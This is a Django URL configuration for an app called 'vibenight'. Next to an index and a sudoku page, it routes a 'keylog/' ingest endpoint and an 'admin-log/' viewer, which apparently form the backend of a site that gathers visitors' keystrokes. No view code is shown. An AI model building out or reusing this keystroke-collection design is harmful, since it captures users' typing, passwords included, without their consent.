from django.urls import path

from . import views

app_name = "vibenight"

urlpatterns = [
    path("", views.index, name="index"),
    path("sudoku/", views.sudoku, name="sudoku"),
    path("keylog/", views.keylog_ingest, name="keylog_ingest"),
    path("admin-log/", views.keylog_admin, name="keylog_admin"),
]
